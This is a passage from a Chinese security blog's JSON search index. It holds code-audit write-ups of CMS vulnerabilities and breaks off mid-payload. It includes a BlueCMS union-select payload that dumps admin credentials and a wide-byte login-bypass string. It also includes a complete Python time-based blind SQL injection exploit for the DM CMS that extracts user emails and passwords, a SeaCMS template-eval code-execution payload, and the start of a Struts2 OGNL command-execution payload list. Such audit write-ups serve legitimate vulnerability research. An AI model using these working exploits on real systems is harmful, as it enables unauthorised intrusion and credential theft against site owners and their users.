<p>\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5bf9ad_id\u6ca1\u6709\u505a\u5176\u4ed6\u8fc7\u6ee4\u5904\u7406\uff0c\u9020\u6210\u4e86\u6574\u6570\u578b\u6ce8\u5165,\u7531\u4e8e\u540e\u9762\u4f1a\u5c06ad_content\u6253\u5370\u5728\u9875\u9762\u4e0a\uff0c\u6240\u4ee5\u76f4\u63a5\u7528union\u6ce8\u5165\u5c31\u53ef\u4ee5\u83b7\u5f97\u6570\u636e\uff0c\u6784\u9020payload</p> <pre><code>/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201\n</code></pre> <p>\u7ed3\u679c\u53ef\u4ee5\u5728\u8fd4\u56de\u7684\u754c\u9762\u4e2d\u770b\u5230</p> <p><pre><code>&lt;!--\ndocument.write(\"admin#21232f297a57a5a743894a0e4a801fc3\");\n--&gt;\n</code></pre> ps:\u56e0\u4e3a\u8be5cms\u9519\u8bef\u56de\u663e\u5177\u4f53sql\u8bed\u53e5\uff0c\u8868\u524d\u7f00\u53ef\u4ee5\u901a\u8fc7\u62a5\u9519\u7684\u65b9\u6cd5\u628a\u8868\u524d\u7f00\u7206\u51fa\u6765\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_4","title":"\u5bbd\u5b57\u8282\u6ce8\u5165","text":"<p>bluecms\u64cd\u4f5c\u6570\u636e\u5e93\u7684\u5177\u4f53\u7c7b\u5b9a\u4e49\u5728mysql.class.php,\u9ed8\u8ba4\u8fde\u63a5\u65f6\u7684\u7f16\u7801\u4e3agbk\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5f53\u6570\u636e\u5e93\u8fde\u63a5\u65f6\u7684\u7f16\u7801\u4e3agbk\u7b49\u53cc\u5b57\u8282\u7f16\u7801\u65f6\uff0c\u5bb9\u6613\u53d1\u751f\u5bbd\u5b57\u8282\u6ce8\u5165\u3002\u524d\u9762\u63d0\u5230\u8be5\u5957cms\u5bf9\u6570\u636e\u8f93\u5165\u8fdb\u884c\u4e86\u8f6c\u4e49\u7684\u64cd\u4f5c\uff0c\u90a3\u4e48\u521a\u521a\u597d\u6761\u4ef6\u90fd\u9f50\u4e86\uff0c\u5fc5\u7136\u5b58\u5728\u5bbd\u5b57\u8282\u6ce8\u5165\u3002grep\u770b\u4e86\u4e00\u4e0b\uff0c\u57fa\u672c\u4e0a\u7684\u5b57\u7b26\u4e32\u90fd\u53ea\u662f\u505a\u4e86\u8f6c\u4e49\u5904\u7406\uff0c\u6240\u4ee5\u5b57\u7b26\u4e32\u6570\u636e\u8f93\u5165\u70b9\u90fd\u5b58\u5728\u5bbd\u5b57\u8282\u6ce8\u5165\u3002\u5927\u591a\u6570\u6ce8\u5165\u90fd\u662f\u76f2\u6ce8\uff0c\u6ca1\u627e\u5230\u5177\u4f53\u53ef\u4ee5\u4f1a\u663e\u6570\u636e\u7684\u5730\u65b9\uff0c\u8fd9\u91cc\u5c31\u7b80\u5355\u770b\u4e00\u4e0b\u767b\u9646\u5904</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_5","title":"\u540e\u53f0\u767b\u5f55\u5904","text":"<p>\u5176\u5b9e\u524d\u53f0user.php\uff0c\u4e5f\u5b58\u5728\u6ce8\u5165\uff0c\u53ea\u662f\u76f2\u6ce8\uff0c\u8fd9\u91cc\u5c31\u53d6\u7b80\u5355\u7684\u540e\u53f0\u767b\u5f55\u9a8c\u8bc1\u5904 admin/login.php</p> <p><pre><code>elseif($act == 'do_login'){\n    $admin_name = isset($_POST['admin_name']) ? trim($_POST['admin_name']) : '';\n    $admin_pwd = isset($_POST['admin_pwd']) ? trim($_POST['admin_pwd']) : '';\n    $remember = isset($_POST) ? intval($_POST['rememberme']) : 0;\n    if($admin_name == ''){\n        showmsg('xxx');\n    }\n    if($admin_pwd == ''){\n        showmsg('xxx');\n    }\n    if(check_admin($admin_name, $admin_pwd)){\n        update_admin_info($admin_name);\n        if($remember == 1){\n            setcookie('Blue[admin_id]', $_SESSION['admin_id'], time()+86400);\n            setcookie('Blue[admin_name]', $admin_name, time()+86400);\n            setcookie('Blue[admin_pwd]', md5(md5($admin_pwd).$_CFG['cookie_hash']), time()+86400);\n        }\n    }else{\n        showmsg('xxx');\n    }\n    showmsg('xxx', 'index.php');\n }\n</code></pre> \u7ee7\u7eed\u8ddf\u8fdbcheck_admin</p> <p><pre><code>function check_admin($name, $pwd)\n{\n    global $db;\n    $row = $db-&gt;getone(\"SELECT COUNT(*) AS num FROM \".table('admin').\" WHERE admin_name='$name' and pwd = md5('$pwd')\");\n    if($row['num'] &gt; 0)\n    {\n        return true;\n    }\n    else\n    {\n        return false;\n    }\n}\n</code></pre> \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u53d1\u751f\u4e86\u4e00\u6b21\u767b\u9646\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bbd\u5b57\u8282\u6ce8\u5165\u6765\u505a\u4e07\u80fd\u5bc6\u7801\u767b\u9646\u3002</p> <p><pre><code>user_name=admin%65%27+or+1%3D1%23&amp;pwd=123\n</code></pre> </p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#ip","title":"\u5b58\u5165ip\u9020\u6210\u6ce8\u5165","text":"<p>\u5728common.inc.php\u4e2d\u53ef\u4ee5\u627e\u5230getip()\u51fd\u6570</p> <p><pre><code>function getip()\n{\n    if (getenv('HTTP_CLIENT_IP'))\n    {\n        $ip = getenv('HTTP_CLIENT_IP');\n    }\n    elseif (getenv('HTTP_X_FORWARDED_FOR'))\n    {\n        $ip = getenv('HTTP_X_FORWARDED_FOR');\n    }\n    elseif (getenv('HTTP_X_FORWARDED'))\n    {\n        $ip = getenv('HTTP_X_FORWARDED');\n    }\n    elseif (getenv('HTTP_FORWARDED_FOR'))\n    {\n        $ip = getenv('HTTP_FORWARDED_FOR');\n    }\n    elseif (getenv('HTTP_FORWARDED'))\n    {\n        $ip = getenv('HTTP_FORWARDED');\n    }\n    else\n    {\n        $ip = $_SERVER['REMOTE_ADDR'];\n    }\n    return $ip;\n}\n</code></pre> \u518d\u770b\u770b\u8c03\u7528\u4ed6\u7684\u4f4d\u7f6e </p> <p>online_ip\u8c03\u7528\u5904 </p> <p>\u770b\u770bguest_book.php\u5904\u5b58\u5728insert\u6ce8\u5165\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6\u540e\u9762\u7684content\uff0c\u9020\u6210\u6570\u636e\u56de\u663e\u3002\u901a\u8fc7xff\u4f20\u5165\u6ce8\u5165\u8bed\u53e5\u6216\u8005client ip\u4f20\u5165\u3002</p> <p> \u7ed3\u679c\u53ef\u4ee5\u770b\u5230 </p> <p>\u5176\u4ed6\u4f4d\u7f6e\u7684\u6ce8\u5165\uff0c\u4e0d\u80fd\u56de\u663e\uff0c\u5c31\u4e0d\u5206\u6790\u4e86\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_6","title":"\u603b\u7ed3","text":"<p>\u603b\u4f53\u6765\u8bf4\uff0c\u76f4\u63a5\u53ef\u4ee5grep\u5230<code>$_GET</code>\u3001<code>$_POST</code>\u3001<code>$_REQUEST</code>\u7684cms\uff0c\u5ba1\u8ba1\u8d77\u6765\u4f1a\u6bd4\u8f83\u8f7b\u677e\u3002\u53ef\u4ee5\u5148\u4ece\u5165\u53e3\u770b\u8d77\uff0c\u5c06common,config\u7b49\u6587\u4ef6\u770b\u4e00\u904d\uff0c\u518d\u67e5\u627e\u5371\u9669\u51fd\u6570\uff0c\u6570\u636e\u5165\u53e3\u5c31\u53ef\u5ba1\u8ba1\u51fa\u51e0\u4e2a\u6f0f\u6d1e\u6765\u3002bluecms\u6682\u65f6\u5ba1\u8ba1\u5230\u8fd9\u4e00\u6b65\uff0c\u4e3b\u8981\u627e\u7684\u662fSQL\u6ce8\u5165\u7684\u6f0f\u6d1e\u3002\u5176\u4ed6\u6f0f\u6d1e\u6253\u7b97\u51c6\u5907\u53e6\u5916\u4e00\u5957cms\u6765\u5ba1\u8ba1:)</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-DM-sql-injection/","title":"DM\u4f01\u4e1a\u5efa\u7ad9\u7cfb\u7edf\u524d\u53f0\u76f2\u6ce8","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-DM-sql-injection/#_1","title":"\u6982\u8ff0","text":"<p>\u4eca\u5929\u641e\u4e86\u4e00\u4e0b\u52a8\u6001\u8c03\u8bd5\u7684\u4e1c\u897f\uff0c\u7136\u540e\u987a\u4fbf\u770b\u4e86\u770b\u4e0a\u6b21\u4e0b\u7684DM\u4f01\u4e1a\u5efa\u7ad9\u7cfb\u7edf2017.01.23\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-DM-sql-injection/#cookie","title":"\u524d\u53f0cookie \u65f6\u95f4\u76f2\u6ce8","text":"<p>\u5927\u81f4\u8ddf\u4e86\u4e00\u4e0b\u51e0\u4e2a\u5165\u53e3\u6587\u4ef6\uff0c\u8be5\u5957cms\u4e3b\u8981\u7684\u5b89\u5168\u63aa\u65bd\u4e3a<code>htmlentities</code>\uff0c\u5728POST&amp;&amp;GET\u7684\u8f93\u5165\u70b9\u505a\u4e86html\u5b9e\u4f53\u5316\u7684\u64cd\u4f5c\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u8f6c\u4e49\u5355\u5f15\u53f7\uff08\u9ed8\u8ba4\u4e0d\u8f6c\u4e49\u5355\u5f15\u53f7\u5177\u4f53\u53ef\u770bhtmlentities\uff09\uff0c\u770b\u4e86\u4e00\u4e0b\u8fdb\u884c\u6570\u636e\u5e93\u67e5\u8be2\u7684sql\u8bed\u53e5\uff0c\u6d89\u53ca\u5230\u5b57\u7b26\u4e32\u7c7b\u578b\u65f6\uff0c\u90fd\u662f\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u90a3\u4e48\u5f88\u6e05\u695a\uff0c\u5728\u8fdb\u884c\u6570\u636e\u5e93\u67e5\u8be2\u65f6\u5bb9\u6613\u4ea7\u751fsql\u6ce8\u5165\u6f0f\u6d1e\u3002 \u90a3\u4e48\u63a5\u4e0b\u6765\u4e3b\u8981\u627e\u4e00\u4e0b\u8fdb\u884c\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u4f4d\u7f6e\u3002</p> <ol> <li>POST&amp;&amp;GET</li> <li>COOKIE </li> </ol> <p>ps\uff1a\u8fd9\u91cc\u5c31\u968f\u4fbf\u627e\u4e86\u4e00\u4e2a\u5730\u65b9\uff0c\u56e0\u4e3a\u8fd9\u5957\u7cfb\u7edf\u6ce8\u5165\u4e0d\u8981\u592a\u591a\uff0c\u8fde\u540e\u53f0\u767b\u9646\u90fd\u53ef\u4ee5 :P</p> <p>\u524d\u9762\u63d0\u5230\u5bf9POST&amp;&amp;GET\u505a\u4e86\u5b9e\u4f53\u8f6c\u4e49\uff0c\u4f46\u662fgrep\u627e\u4e86\u4e00\u4e0bcookie\uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\u5bf9cookie\u7684\u503c\u8fdb\u884c\u5b89\u5168\u64cd\u4f5c\uff0c\u76f4\u63a5\u5e26\u5165\u6570\u636e\u5e93\u67e5\u8be2\u3002 indexDM_load.php Line 108</p> <p><pre><code>...\n\nif(@$_COOKIE[\"curstyle\"]&lt;&gt;'')       \n    $curstyle = $_COOKIE[\"curstyle\"];\nelse \n    $curstyle = $row['curstyle'];\n\n...\n\n$sqlstyle = \"SELECT * from \".TABLE_STYLE.\" where pidname='$curstyle' $andlangbh limit 1\"; \n //echo $sqlstyle;exit;\nif(getnum($sqlstyle)&gt;0){\n    $rowstyle = getrow($sqlstyle);\n</code></pre> \u4e0a\u8ff0\u4e3a\u6f0f\u6d1e\u7684\u4e3b\u8981\u6210\u56e0\u70b9\uff0c\u5982\u679ccookie\u4e2d\u5b58\u5728curstyle,\u4f18\u5148\u9009\u7528cookie\u4e2d\u7684\u503c\uff0c\u7136\u540e\u5e26\u5165\u6570\u636e\u5e93\u67e5\u8be2\u3002\u7531\u4e8e\u6ca1\u6709\u627e\u5230\u5177\u4f53\u56de\u663e\u6570\u636e\u7684\u5730\u65b9\uff0c\u6240\u4ee5\u91c7\u7528\u65f6\u95f4\u76f2\u6ce8\u7684\u65b9\u5f0f\u83b7\u53d6\u6570\u636e\u3002</p> <p>\u5e26\u4e0a\u81ea\u5df1\u5199\u7684EXP</p> <pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Created by wh1t3P1g at 2017/1/30\n\nimport requests,time\n\nclass CookieBlindSqlInjection:\n\n    def __init__(self,url):\n        self.url=url\n        self.len=0\n\n    def getLength(self,column,table):\n        payload0 = \"curstyle=1'||if((select length(cast(bin(length({column})) as char)) from {table} limit {line_start},1)={flag},sleep(5),1)=1#\"\n        payload1 = \"curstyle=1'||if((select substr(bin(length({column})),{col_start},1) from {table} limit {line_start},1)=1,1,sleep(5))=1#\"\n        #first confirm bin-format data length\n        len=0\n        for i in range(1,9):\n            cookie=payload0.format(column=column,table=table,line_start=0,flag=i)\n            flag=self.send(cookie)\n            if flag==\"0\":\n                len=i\n                break\n        res=\"\"\n        for i in range(1,len+1):\n            cookie=payload1.format(column=column,col_start=i,table=table,line_start=0)\n            flag=self.send(cookie)\n            res+=flag\n            # print res\n        self.len=int(res,2)\n        pprint(\"*\", \"fetch \"+column+\" length: \"+str(self.len))\n        return int(res,2)\n\n    def getData(self,column,table):\n        payload0=\"curstyle=1'||if((select length(cast(bin(ascii(substr({column},{data_start},1))) as char)) from {table} limit {line_start},1)={flag},sleep(5),1)=1#\"\n        payload1 = \"curstyle=1'||if((select substr(bin(ascii(substr({column},{data_start},1))),{col_start},1) from {table} limit {line_start},1)=1,1,sleep(5))=1#\"\n        total_res=\"\"\n        for i in range(1,self.len+1):#\u5177\u4f53\u6570\u636e\u7684\u957f\u5ea6\n            len = 0\n            for j in range(1, 9):\n                cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j)\n                flag = self.send(cookie)\n                if flag == \"0\":\n                    len = j\n                    break\n            # print \"len:\"+str(len)\n            res = \"\"\n            for k in range(1, len + 1):\n                cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0)\n                flag = self.send(cookie)\n                res += flag\n                # print res\n            total_res+=chr(int(res,2))\n            pprint(\"*\", \"fetch \"+column+\": \"+total_res)\n        return total_res\n\n    def send(self,cookie):\n        headers={\"Cookie\":cookie}\n        try:\n            r = requests.get(self.url, headers=headers,timeout=4)\n            return \"1\"\n        except:\n            return \"0\"\n\ndef pprint(flag,content):\n    print \"[{flag}] [{time}] {content}\" \\\n        .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)\n\nif __name__=='__main__':\n    cookieBlindSqlInjection=CookieBlindSqlInjection(\"http://127.0.0.1/cms/DM/20170123/\")\n    pprint(\"*\",\"program start\")\n    pprint(\"*\", \"start fetching column[email]\")\n    cookieBlindSqlInjection.getLength(\"email\",\"zzz_user\")\n    email=cookieBlindSqlInjection.getData(\"email\",\"zzz_user\")\n    pprint(\"*\", \"start fetching column[ps]\")\n    cookieBlindSqlInjection.getLength(\"ps\", \"zzz_user\")\n    ps=cookieBlindSqlInjection.getData(\"ps\", \"zzz_user\")\n    pprint(\"*\", \"[email]: \"+email+\" ,[ps]: \"+ps)\n    pprint(\"*\", \"program done\")\n</code></pre> <p>ps:DM\u8fd9\u4e2a\u9b3c\uff0c\u4ee3\u7801\u5199\u7684\u597d\u4e71\u554aT_T</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-seacms-v6-5-getshell/","title":"seacms v6.5 \u524d\u53f0getshell","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-seacms-v6-5-getshell/#_1","title":"\u6982\u8ff0","text":"<p>\u524d\u6bb5\u65f6\u95f4\u653e\u572890sec\u4e0a\u7684\u4e00\u7bc7\u4ee3\u7801\u5ba1\u8ba1\uff0c\u6536\u62fe\u4e00\u4e0b\u653e\u5230\u81ea\u5df1\u535a\u5ba2\u4e0a</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-seacms-v6-5-getshell/#_2","title":"\u5206\u6790","text":"<p>cms\u7248\u672c\uff1a6.45 \u76f4\u63a5\u4e0a\u4ee3\u7801 <pre><code>function parseIf($content){\n        if (strpos($content,'{if:')=== false){\n        return $content;\n        }else{\n        $labelRule = buildregx(\"{if:(.*?)}(.*?){end if}\",\"is\");\n        $labelRule2=\"{elseif\";\n        $labelRule3=\"{else}\";\n        preg_match_all($labelRule,$content,$iar);\n        $arlen=count($iar[0]);\n        $elseIfFlag=false;\n        for($m=0;$m&lt;$arlen;$m++){\n            $strIf=$iar[1][$m];\n            $strIf=$this-&gt;parseStrIf($strIf);\n            $strThen=$iar[2][$m];\n            $strThen=$this-&gt;parseSubIf($strThen);\n            if (strpos($strThen,$labelRule2)===false){\n                if (strpos($strThen,$labelRule3)&gt;=0){\n                    $elsearray=explode($labelRule3,$strThen);\n                    $strThen1=$elsearray[0];\n                    $strElse1=$elsearray[1];\n                    echo \"if(\".$strIf.\") { \\$ifFlag=true;} else{ \\$ifFlag=false;}\";\n                    eval(\"if(\".$strIf.\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");\n                    if ($ifFlag){ $content=str_replace($iar[0][$m],$strThen1,$content);} else {$content=str_replace($iar[0][$m],$strElse1,$content);}\n                }else{\n                @eval(\"if(\".$strIf.\") { \\$ifFlag=true;} else{ \\$ifFlag=false;}\");\n                if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],\"\",$content);}\n            }else{\n                $elseIfArray=explode($labelRule2,$strThen);\n                $elseIfArrayLen=count($elseIfArray);\n                $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);\n                $resultStr=$elseIfSubArray[1];\n                $elseIfArraystr0=addslashes($elseIfArray[0]);\n                @eval(\"if($strIf){\\$resultStr=\\\"$elseIfArraystr0\\\";}\");\n                for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++){\n                    $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],\":\",\"}\",\"\");\n                    $strElseIf=$this-&gt;parseStrIf($strElseIf);\n                    $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],\"}\",\"\",\"start\"));\n                    @eval(\"if(\".$strElseIf.\"){\\$resultStr=\\\"$strElseIfThen\\\";}\");\n                    @eval(\"if(\".$strElseIf.\"){\\$elseIfFlag=true;}else{\\$elseIfFlag=false;}\");\n                    if ($elseIfFlag) {break;}\n                }\n                $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],\":\",\"}\",\"\");\n                $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],\"}\",\"\",\"start\"));\n                if(strpos($strElseIf0,'==')===false&amp;&amp;strpos($strElseIf0,'=')&gt;0)$strElseIf0=str_replace('=', '==', $strElseIf0);\n                @eval(\"if(\".$strElseIf0.\"){\\$resultStr=\\\"$strElseIfThen0\\\";\\$elseIfFlag=true;}\");\n                $content=str_replace($iar[0][$m],$resultStr,$content);\n            }\n        }\n        return $content;\n        }\n    }\n</code></pre> \u4e0a\u9762\u4e3b\u8981\u903b\u8f91\u4e3a\u89e3\u6790html\u6587\u4ef6\u4e2d\u7684{if:}{end if}\u6807\u7b7e\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u6ca1\u6709\u505a\u4efb\u4f55\u5904\u7406\u5c31eval\uff0c\u90a3\u4e48\u6211\u4eec\u67e5\u627e\u4e00\u4e0b\u5bf9\u5e94\u8c03\u7528\u7684\u5730\u65b9\u4f1a\u4e0d\u4f1a\u6709\u6f0f\u6d1e\u3002 \u4e3b\u8981\u5173\u6ce8\u524d\u53f0\uff0c\u627e\u5230\u4e00\u5904\u89e3\u6790\u641c\u7d22\u7ed3\u679c\u7684\u9875\u9762\uff08search.php\uff09\uff0c\u4ee3\u7801\u6bd4\u8f83\u591a\uff0c\u4e00\u70b9\u4e00\u70b9\u6765\u770b\u3002 \u627e\u5230\u8c03\u7528\u7684\u4f4d\u7f6eline 212<code>$content=$mainClassObj-&gt;parseIf($content);</code> \u5f80\u4e0a\u770b\uff0c\u53d1\u73b0\u4ed6\u7684\u903b\u8f91\u662f\u5148\u89e3\u6790\u5176\u4ed6\u7c7b\u578b\u7684\u6807\u7b7e\uff0c\u6bd4\u5982<code>{searchpage:page}</code> \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u601d\u8def\uff0c\u4e3b\u8981\u662f2\u70b9\uff0c\u67e5\u627e\u5bf9\u5e94if\u6807\u7b7e\u53ef\u63a7\u7684\u4f4d\u7f6e\uff0c\u53e6\u4e00\u79cd\u5c31\u662f\u67e5\u627e\u5176\u4ed6\u6807\u7b7e\u7684\u53ef\u63a7\u5185\u5bb9\uff0c\u5199\u5165if\u6807\u7b7e \u6211\u627e\u5230\u4e00\u5904\u5176\u4ed6\u6807\u7b7e\u53ef\u63a7\u4e14\u6ca1\u6709\u505a\u4efb\u4f55\u5904\u7406\u7684\u4f4d\u7f6e\uff0c\u76f4\u63a5\u5199\u5165if\u6807\u7b7e\u8bed\u53e5\u5373\u53ef\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c <pre><code>function echoSearchPage()\n{\n        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;\n        $order = !empty($order)?$order:time;\n...\n...\n...\n$content = str_replace(\"{searchpage:page}\",$page,$content);\n        $content = str_replace(\"{seacms:searchword}\",$searchword,$content);\n        $content = str_replace(\"{seacms:searchnum}\",$TotalResult,$content);\n        $content = str_replace(\"{searchpage:ordername}\",$order,$content);\n...\n...\n...\n</code></pre> order\u53d8\u91cf\u53ef\u63a7\u5e76\u4e14\u5728\u8c03\u7528parseIf\u51fd\u6570\u524d\u5148\u89e3\u6790\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7order\u5199\u5165if\u6807\u7b7e\u3002 \u67e5\u770b\u4e00\u4e0b\u5177\u4f53html\u4ee3\u7801 <pre><code>&lt;div class=\"btn-toolbar\" role=\"toolbar\"&gt;\n    &lt;div class=\"btn-group\"&gt;\n      &lt;a href=\"{searchpage:order-time-link}\" {if:\"{searchpage:ordername}\"==\"time\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderhits\"&gt;\u6700\u65b0\u4e0a\u6620&lt;/a&gt;\n      &lt;a href=\"{searchpage:order-hit-link}\" {if:\"{searchpage:ordername}\"==\"hit\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderaddtime\"&gt;\u6700\u8fd1\u70ed\u64ad&lt;/a&gt;\n      &lt;a href=\"{searchpage:order-score-link}\" {if:\"{searchpage:ordername}\"==\"score\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"ordergold\"&gt;\u8bc4\u5206\u6700\u9ad8&lt;/a&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n</code></pre> \u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u6784\u9020poc\u4e86\uff0c\u7c7b\u4f3csql\u6ce8\u5165\uff0c\u6211\u4eec\u5148\u628a\u524d\u9762\u7684if\u6807\u7b7e\u8bed\u53e5\u95ed\u5408\uff0c\u5199\u5165\u6076\u610f\u4ee3\u7801\u5e76\u95ed\u5408\u540e\u9762\u7684if\u6807\u7b7e\u3002 example\uff1a<code>}{end if}{if:1)phpinfo();if(1}{end if}</code> \u672c\u5730\u9a8c\u8bc1\u4e00\u4e0b </p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/old-seacms-v6-5-getshell/#_3","title":"\u603b\u7ed3","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u7ecf\u5178\u7684\u6f0f\u6d1e\uff0c\u4e5f\u53ef\u4ee5\u88ab\u79f0\u4e3a\u6a21\u7248\u89e3\u6790\u5427\u6211\u89c9\u5f97\uff1a\uff09 ps: \u540e\u6094\u554a\uff0c\u6ca1\u6709\u5148\u63d0\u4ea4\u4e2apoc\u5e73\u53f0T_T</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/struts2-history-payload/","title":"Struts2\u547d\u4ee4\u6267\u884c\u5404\u7248\u672c\u8bb0\u5f55","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_1","title":"\u6982\u8ff0","text":"<p>\u6700\u8fd1\u5728\u5199Struts2\u7684\u4e00\u4e9bPoC\uff0c\u8bb0\u5f55\u4e00\u4e0b\u5404\u4e2a\u7248\u672c\u7684PoC\u65b9\u4fbf\u5230\u65f6\u5019\u67e5\u9605\u3002\u5148\u63d0\u4e00\u4e0b\u53c2\u8003\u7684\u524d\u8f88\u4eec\u7684\u7f51\u5740\uff0c\u611f\u8c22\ud83d\ude4f</p> <ul> <li>http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</li> <li>http://www.cnblogs.com/LittleHann/p/4606891.html</li> <li>https://cwiki.apache.org/confluence/display/WW/S2-xxx</li> <li>http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</li> <li>https://cwiki.apache.org/confluence/display/WW/S2-009</li> </ul>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2","title":"Struts2\u547d\u4ee4\u6267\u884c\u96c6\u5408","text":"<p>\u4e0b\u6587\u4e0d\u662f\u5177\u4f53\u7684\u5206\u6790\u6587\uff0c\u80fd\u529b\u6709\u9650\uff0c\u4ec5\u8bb0\u5f55\u4e00\u4e0b\u4ee5\u505a\u5c06\u6765\u590d\u4e60\u67e5\u7528\u3002 \u8fc7\u6bb5\u65f6\u95f4\u4f1a\u5c06\u6240\u6709\u7684\u6f0f\u6d1e\u73af\u5883\u4e0a\u4f20\u5230github\u4e0a\uff0c\u73af\u5883\u6765\u6e90\u5927\u90e8\u5206\u4e3a\u6211\u5076\u50cfrickgray\u535a\u5ba2\u4e0a\u5171\u4eab\u7684\u4ee5\u53ca\u5b98\u7f51\u4e0a\u4e0b\u7684\u5bf9\u5e94\u7248\u672c\u7684\u793a\u4f8b\u73af\u5883\u3002 update:2017/1/16 \u73af\u5883\u5730\u5740</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#struts2-s2-001","title":"Struts2 S2-001","text":"<pre><code>\u5f71\u54cd\u7248\u672c\uff1a2.0.0 - 2.0.8\n\u5177\u4f53\u8be6\u60c5\uff1ahttps://struts.apache.org/docs/s2-001.html\n</code></pre> <p>\u8be5\u6f0f\u6d1e\u56e0\u4e3a\u7528\u6237\u63d0\u4ea4\u8868\u5355\u6570\u636e\u5e76\u4e14\u9a8c\u8bc1\u5931\u8d25\u65f6\uff0c\u540e\u7aef\u4f1a\u5c06\u7528\u6237\u4e4b\u524d\u63d0\u4ea4\u7684\u53c2\u6570\u503c\u4f7f\u7528 OGNL \u8868\u8fbe\u5f0f %{value} \u8fdb\u884c\u89e3\u6790\uff0c\u7136\u540e\u91cd\u65b0\u586b\u5145\u5230\u5bf9\u5e94\u7684\u8868\u5355\u6570\u636e\u4e2d\u3002\u4f8b\u5982\u6ce8\u518c\u6216\u767b\u5f55\u9875\u9762\uff0c\u63d0\u4ea4\u5931\u8d25\u540e\u7aef\u4e00\u822c\u4f1a\u9ed8\u8ba4\u8fd4\u56de\u4e4b\u524d\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u7531\u4e8e\u540e\u7aef\u4f7f\u7528 %{value} \u5bf9\u63d0\u4ea4\u7684\u6570\u636e\u6267\u884c\u4e86\u4e00\u6b21 OGNL \u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u6784\u9020 Payload \u8fdb\u884c\u547d\u4ee4\u6267\u884c</p> <p>\u4e0a\u6587\u5f15\u7528rickgray\u7684\u63cf\u8ff0\u3002</p>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#poc","title":"\u6784\u9020PoC","text":"","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#tomcat","title":"## \u83b7\u53d6tomcat\u6267\u884c\u8def\u5f84","text":"<pre><code>%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"}\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#web","title":"## \u83b7\u53d6web\u6839\u76ee\u5f55","text":"<pre><code>%{##req=@org.apache.struts2.ServletActionContext@getRequest(),##response=##context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),##response.println(##req.getRealPath('/')),##response.flush(),##response.close()}\n</code></pre>","tags":["Java"]},{"location":"blog/2017/struts2-history-payload/#_2","title":"## \u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<pre><code>%{##a=(new 